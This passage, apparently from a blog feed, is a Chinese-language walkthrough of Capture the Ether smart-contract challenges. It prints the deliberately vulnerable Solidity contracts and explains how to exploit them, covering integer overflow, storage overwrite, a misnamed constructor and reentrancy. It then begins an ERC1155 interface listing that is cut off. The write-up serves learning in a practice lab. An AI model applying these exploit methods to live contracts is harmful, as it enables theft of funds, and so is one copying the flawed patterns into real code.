&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：合约是一个与ERC20标准类似的货币，没有使用SafeMath库进行检查，问题更大的是<code>transferFrom()</code>函数中调用<code>_transfer()</code>不是在<code>from</code>和<code>to</code>之间的交易而是<code>msg.sender</code>和<code>to</code>之间的交易，这就是漏洞的关键<br>我们可以利用一份代理地址，玩家可以给代理地址分配任意的<code>allowance</code>，由代理地址向玩家和另一个地址进行<code>transferFrom()</code>，这样在执行<code>_transfer()</code>的过程中，代理地址的余额将会发生溢出，获得大量的货币，最后再将代理地址的余额用<code>transfer()</code>转移给玩家就可以通过挑战了<br>大致流程<br>player：addr1<br>ToAccount：addr2<br>ProxyAccount：addr3  </p><ol><li>player.approve(addr3,1000000)        &#x2F;&#x2F;满足后续allowance[player][ProxyAccount]的条件  </li><li>ProxyAccount.transferFrom(addr1,addr2,1)        &#x2F;&#x2F;ToAccount无关紧要，交易完成后balanceOf[addr3]将会获得很多</li><li>ProxyAccount.transfer(player,1000000)        &#x2F;&#x2F;将获得的余额转入玩家地址</li></ol><h2 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h2><p>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract RetirementFundChallenge &#123;<br>    uint256 startBalance;<br>    address owner = msg.sender;<br>    address beneficiary;<br>    uint256 expiration = now + 10 years;<br><br>    function RetirementFundChallenge(address player) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        beneficiary = player;<br>        startBalance = msg.value;<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function withdraw() public &#123;<br>        require(msg.sender == owner);<br><br>        if (now &lt; expiration) &#123;<br>            // early withdrawal incurs a 10% penalty<br>            msg.sender.transfer(address(this).balance * 9 / 10);<br>        &#125; else &#123;<br>            msg.sender.transfer(address(this).balance);<br>        &#125;<br>    &#125;<br><br>    function collectPenalty() public &#123;<br>        require(msg.sender == beneficiary);<br><br>        uint256 withdrawn = startBalance - address(this).balance;<br><br>        // an early withdrawal occurred<br>        require(withdrawn &gt; 0);<br><br>        // penalty is what&#x27;s left<br>        msg.sender.transfer(address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：要能够进行transfer操作除了own本人进行withdraw后，我们才能进行。但是因为withdrawn是一个uint256的数，我们只要往合约中投入一点ether，使得withdrawn发生溢出就能够绕过要求进行提款。<br>攻击实现：我们看到在合约中并没有任何接受ether的方法，所以不能向合约直接发送ether，所以这里需要通过<strong>函数selfdestruct</strong><br>可参考Ethernaut 题8</p><h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><p>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract MappingChallenge &#123;<br>    bool public isComplete;<br>    uint256[] map;<br><br>    function set(uint256 key, uint256 value) public &#123;<br>        // Expand dynamic array as needed<br>        if (map.length &lt;= key) &#123;<br>            map.length = key + 1;<br>        &#125;<br><br>        map[key] = value;<br>    &#125;<br><br>    function get(uint256 key) public view returns (uint256) &#123;<br>        return map[key];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h2><p>要求：取走合约中的钱<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract DonationChallenge &#123;<br>    struct Donation &#123;<br>        uint256 timestamp;<br>        uint256 etherAmount;<br>    &#125;<br>    Donation[] public donations;<br><br>    address public owner;<br><br>    function DonationChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>        <br>        owner = msg.sender;<br>    &#125;<br>    <br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function donate(uint256 etherAmount) public payable &#123;<br>        // amount is in ether, but msg.value is in wei<br>        uint256 scale = 10**18 * 1 ether;<br>        require(msg.value == etherAmount / scale);<br><br>        Donation donation;<br>        donation.timestamp = now;<br>        donation.etherAmount = etherAmount;<br><br>        donations.push(donation);<br>    &#125;<br><br>    function withdraw() public &#123;<br>        require(msg.sender == owner);<br>        <br>        msg.sender.transfer(address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：只有成为owner才能进行withdraw，将钱取出来。（合约中没有任何直接修改owner的方法）<br>在donate函数中直接对结构体Donation进行了初始化，并没有使用memory关键字，于是此处的Donation存储在storage中，由合约对属性的定义顺序，owner的key值为1，恰好donation.etherAmount会将其覆盖，也就是说：我们只需要将我们的地址作为参数执行donate方法便可以更改owner。<br>因为<code>require(msg.value == etherAmount / scale)</code>这一条件。我们将自己的地址进行计算一下，来得知我们需要向合约发送多少value。</p><p>实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getValut(uint256 amount) public pure returns (uint2565) &#123;<br>    return amount / 10**36;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/01/Capture-the-Ether/storage_structure_14.png"><br>通过计算得出msg.value的值为979192615699<br><img src="/2023/04/01/Capture-the-Ether/storage_structure_15.png"><br>在执行donate方法成功后我们再次调用owner可以看到owner已经是我们自己的地址了，接着进行withdraw就可以通关了。</p><h2 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h2><p>要求：<del>等到50年后</del>取走合约中的money<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract FiftyYearsChallenge &#123;<br>    struct Contribution &#123;<br>        uint256 amount;<br>        uint256 unlockTimestamp;<br>    &#125;<br>    Contribution[] queue;<br>    uint256 head;<br><br>    address owner;<br>    function FiftyYearsChallenge(address player) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        owner = player;<br>        queue.push(Contribution(msg.value, now + 50 years));<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function upsert(uint256 index, uint256 timestamp) public payable &#123;<br>        require(msg.sender == owner);<br><br>        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;<br>            // Update existing contribution amount without updating timestamp.<br>            Contribution storage contribution = queue[index];<br>            contribution.amount += msg.value;<br>        &#125; else &#123;<br>            // Append a new contribution. Require that each contribution unlock<br>            // at least 1 day after the previous one.<br>            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);<br><br>            contribution.amount = msg.value;<br>            contribution.unlockTimestamp = timestamp;<br>            queue.push(contribution);<br>        &#125;<br>    &#125;<br><br>    function withdraw(uint256 index) public &#123;<br>        require(msg.sender == owner);<br>        require(now &gt;= queue[index].unlockTimestamp);<br><br>        // Withdraw this and any earlier contributions.<br>        uint256 total = 0;<br>        for (uint256 i = head; i &lt;= index; i++) &#123;<br>            total += queue[i].amount;<br><br>            // Reclaim storage.<br>            delete queue[i];<br>        &#125;<br><br>        // Move the head of the queue forward so we don&#x27;t have to loop over<br>        // already-withdrawn contributions.<br>        head = index + 1;<br><br>        msg.sender.transfer(total);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：<br>第一点：如何解决50年的时间问题：这里的<code>unlockTimestamp</code>可以发生上溢从而归零。所以在upsert函数中通过设置<code>timestamp=0</code>可以将时间限制解除。于是需要对upsert进行两次调用，第一次将<code>unlockTimeStamp</code>设置为<code>+1days</code>就能发生溢出的极限值，第二次调用就可以绕过检查设置为0。<br>根据前面几题的经验可以看到在upsert函数中<code>contribution.amount</code>和<code>contribution.unlockTimestamp</code>都造成了变量覆盖：分别将<code>queue</code>的长度和<code>head</code>的值进行了覆盖。<br>实现：</p><ol><li>部署合约</li><li>进行第一次upsert调用，设置为时间溢出的极限值<br><img src="/2023/04/01/Capture-the-Ether/Fift_1.png"><del>这里应该设1wei，否则queue的length不够</del></li><li>进行第二次upsert调用，设置为0</li></ol><p><img src="/2023/04/01/Capture-the-Ether/Fift_2.png"><br>第一次调用中同时改变了head的值，index大于2不是硬性要求<br>4. 第三次进行withdraw调用<br><img src="/2023/04/01/Capture-the-Ether/Fift_3.png"></p><h1 id="Accounts"><a href="#Accounts" class="headerlink" title="Accounts"></a>Accounts</h1><p>这一部分有一些关于以太坊的密码学原理包括椭圆曲线加密，ECDSA签名算法等，他们与合约漏洞并无关系</p><h2 id="Fuzzy-identity"><a href="#Fuzzy-identity" class="headerlink" title="Fuzzy identity"></a>Fuzzy identity</h2><p>要求：获取私钥<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>interface IName &#123;<br>    function name() external view returns (bytes32);<br>&#125;<br><br>contract FuzzyIdentityChallenge &#123;<br>    bool public isComplete;<br><br>    function authenticate() public &#123;<br>        require(isSmarx(msg.sender));<br>        require(isBadCode(msg.sender));<br><br>        isComplete = true;<br>    &#125;<br><br>    function isSmarx(address addr) internal view returns (bool) &#123;<br>        return IName(addr).name() == bytes32(&quot;smarx&quot;);<br>    &#125;<br><br>    function isBadCode(address _addr) internal pure returns (bool) &#123;<br>        bytes20 addr = bytes20(_addr);<br>        bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;;<br>        bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;;<br><br>        for (uint256 i = 0; i &lt; 34; i++) &#123;<br>            if (addr &amp; mask == id) &#123;<br>                return true;<br>            &#125;<br>            mask &lt;&lt;= 4;<br>            id &lt;&lt;= 4;<br>        &#125;<br><br>        return false;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：要通过验证需要通过<code>isSmarx()</code>和<code>isBadCode()</code>的验证，因此需要一个能返回一个特殊名字<code>smarx</code>的合约以及合约地址包含十六进制字符串<code>badc0de</code>。<br>因此，这个挑战就是要暴力破解大量合约，直到你最终获得一个包含目标字符串的合约地址</p><blockquote><p>tips：<br>十六进制字面常数<br>十六进制字面常数以关键字 hex 打头，后面紧跟着用单引号或双引号引起来的字符串（例如，hex”001122FF”）。 字符串的内容必须是一个十六进制的字符串，它们的值将使用二进制表示。它们可以隐式地转换成 bytes1，……，bytes32，如果合适的话，还可以转换成 bytes 以及 string。</p></blockquote><h2 id="Public-Key"><a href="#Public-Key" class="headerlink" title="Public Key"></a>Public Key</h2><p>要求：账户的公钥<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PublicKeyChallenge &#123;<br>    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;<br>    bool public isComplete;<br><br>    function authenticate(bytes publicKey) public &#123;<br>        require(address(keccak256(publicKey)) == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们都知道以太坊的地址与比特币的一样由公钥计算而来。<br>在用户进行交易时往往需要进行签名，而这个签名中就含有公钥（供其他人验证交易来自于该账户），</p><h2 id="Account-Takeover"><a href="#Account-Takeover" class="headerlink" title="Account Takeover"></a>Account Takeover</h2><p>要求：成为owner<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract AccountTakeoverChallenge &#123;<br>    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;<br>    bool public isComplete;<br><br>    function authenticate() public &#123;<br>        require(msg.sender == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h1><h2 id="Assume-ownership"><a href="#Assume-ownership" class="headerlink" title="Assume ownership"></a>Assume ownership</h2><p>要求：成为owner<br>源代码：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract AssumeOwnershipChallenge &#123;<br>    address owner;<br>    bool public isComplete;<br><br>    function AssumeOwmershipChallenge() public &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    function authenticate() public &#123;<br>        require(msg.sender == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：构造函数的错误使其变成了一个公共的方法，使得任何人都可以直接使用来声明所有权。</p><h2 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h2><p>要求：获取Token合约中的余额<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>interface ITokenReceiver &#123;<br>    function tokenFallback(address from, uint256 value, bytes data) external;<br>&#125;<br><br>contract SimpleERC223Token &#123;<br>    // Track how many tokens are owned by each address.<br>    mapping (address =&gt; uint256) public balanceOf;<br><br>    string public name = &quot;Simple ERC223 Token&quot;;<br>    string public symbol = &quot;SET&quot;;<br>    uint8 public decimals = 18;<br><br>    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);<br><br>    event Transfer(address indexed from, address indexed to, uint256 value);<br><br>    function SimpleERC223Token() public &#123;<br>        balanceOf[msg.sender] = totalSupply;<br>        emit Transfer(address(0), msg.sender, totalSupply);<br>    &#125;<br><br>    function isContract(address _addr) private view returns (bool is_contract) &#123;<br>        uint length;<br>        assembly &#123;<br>            //retrieve the size of the code on target address, this needs assembly<br>            length := extcodesize(_addr)<br>        &#125;<br>        return length &gt; 0;<br>    &#125;<br><br>    function transfer(address to, uint256 value) public returns (bool success) &#123;<br>        bytes memory empty;<br>        return transfer(to, value, empty);<br>    &#125;<br><br>    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;<br>        require(balanceOf[msg.sender] &gt;= value);<br><br>        balanceOf[msg.sender] -= value;<br>        balanceOf[to] += value;<br>        emit Transfer(msg.sender, to, value);<br><br>        if (isContract(to)) &#123;<br>            ITokenReceiver(to).tokenFallback(msg.sender, value, data);<br>        &#125;<br>        return true;<br>    &#125;<br><br>    event Approval(address indexed owner, address indexed spender, uint256 value);<br><br>    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;<br><br>    function approve(address spender, uint256 value)<br>        public<br>        returns (bool success)<br>    &#123;<br>        allowance[msg.sender][spender] = value;<br>        emit Approval(msg.sender, spender, value);<br>        return true;<br>    &#125;<br><br>    function transferFrom(address from, address to, uint256 value)<br>        public<br>        returns (bool success)<br>    &#123;<br>        require(value &lt;= balanceOf[from]);<br>        require(value &lt;= allowance[from][msg.sender]);<br><br>        balanceOf[from] -= value;<br>        balanceOf[to] += value;<br>        allowance[from][msg.sender] -= value;<br>        emit Transfer(from, to, value);<br>        return true;<br>    &#125;<br>&#125;<br><br>contract TokenBankChallenge &#123;<br>    SimpleERC223Token public token;<br>    mapping(address =&gt; uint256) public balanceOf;<br><br>    function TokenBankChallenge(address player) public &#123;<br>        token = new SimpleERC223Token();<br><br>        // Divide up the 1,000,000 tokens, which are all initially assigned to<br>        // the token contract&#x27;s creator (this contract).<br>        balanceOf[msg.sender] = 500000 * 10**18;  // half for me<br>        balanceOf[player] = 500000 * 10**18;      // half for you<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return token.balanceOf(this) == 0;<br>    &#125;<br><br>    function tokenFallback(address from, uint256 value, bytes) public &#123;<br>        require(msg.sender == address(token));<br>        require(balanceOf[from] + value &gt;= balanceOf[from]);<br><br>        balanceOf[from] += value;<br>    &#125;<br><br>    function withdraw(uint256 amount) public &#123;<br>        require(balanceOf[msg.sender] &gt;= amount);<br><br>        require(token.transfer(msg.sender, amount));<br>        balanceOf[msg.sender] -= amount;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：合约自定义了<code>ERC-233</code>标准，（ERC-233与ERC-20的不同之处在于如果接收人的地址是一个合约将会通过<code>tokenFallback</code>方法来通知接收方转移。在Token合约创建的时候，就有一百万的token余额，其中50万给了创建者，50万给了玩家。所以需要获取更多的token来完成挑战。<br>可以看到如果我们通过攻击合约利用Token合约向Bank转账时，会触发<code>isContract</code>执行Bank合约中的<code>tokenFallback</code>从而增加Bank中的余额，之后我们再通过<code>withdraw</code>向Bank取款就行了。  </p><blockquote><p>同时在<code>withdraw</code>函数中合约先向我们转账再减我们的余额，这使得我们可以重复地提取我们的余额，重入的过程将会是：<code>challenge.withdraw() -&gt; token.transfer() -&gt; msg.sender.tokenFallback() -&gt; ... </code>直到余额为0。</p></blockquote><p>实现：先部署攻击合约，再将攻击合约作为player部署Bank<br><img src="/2023/04/01/Capture-the-Ether/TokenBank_1.png"><br>接着直接调用<code>CallWithdraw</code>（执行成功后，可以在交易日志中看到进行了两次transfer调用。进入<code>tokenFallback</code>后又调用了一次）<br><img src="/2023/04/01/Capture-the-Ether/TokenBank.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;由于Ropsten测试网络在2022.10.5日起已被正式弃用；因此该网页上的在线编写功能无法正常运行；所有实现均在remix上复现，收录在本系列之中，希望对各位看官有所帮助&lt;br&gt;&lt;del&gt;(TvT)&lt;/del&gt; &lt;del&gt;(TvT)&lt;/del&gt; &lt;del&gt;(TvT)&lt;/del&gt; &lt;del&gt;(TvT)&lt;/del&gt; &lt;del&gt;(TvT)&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="靶场" scheme="http://lexlady.top/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="题解" scheme="http://lexlady.top/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Remix" scheme="http://lexlady.top/tags/Remix/"/>
    
    <category term="CapturetheEther" scheme="http://lexlady.top/tags/CapturetheEther/"/>
    
  </entry>
  
  <entry>
    <title>ERC1155</title>
    <link href="http://lexlady.top/2023/03/12/ERC1155/"/>
    <id>http://lexlady.top/2023/03/12/ERC1155/</id>
    <published>2023-03-12T15:34:13.000Z</published>
    <updated>2023-11-12T17:42:12.884Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IERC1155 &#123;<br>    function safeTransferFrom(<br>        address from,<br>        address to,<br>        uint256 id,<br>        uint256 value,<br>        bytes calldata data<br>    ) external;<br><br>    function safeBatchTransferFrom(<br>        address from,<br>        address to,<br>        uint256[] calldata ids,<br>        uint256[] calldata values,<br>        bytes calldata data<br>    ) external;<br><br>    function balanceOf(address owner, uint256 id) external view returns (uint256);<br><br>    function balanceOfBatch(<br>        address[] calldata owners,<br>        uint256[] calldata ids<br>    ) external view returns (uint256[] memory);<br><br>    function setApprovalForAll(address operator, bool approved) external;<br><br>    function isApprovedForAll(<br>        address owner,<br>        address operator<br>    ) external view returns (bool);<br>&#125;<br><br>interface IERC1155TokenReceiver &#123;<br>    function onERC1155Received(<br>        address operator,<br>        address from,<br>        uint256 id,<br>        uint256 value,<br>        bytes calldata data<br>    ) external returns (bytes4);<br><br>    function onERC1155BatchReceived(<br>        address operator,<br>        address from,<br>        uint256[] calldata ids,<br>        uint256[] calldata values,<br>        bytes calldata data<br>    ) external returns (bytes4);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 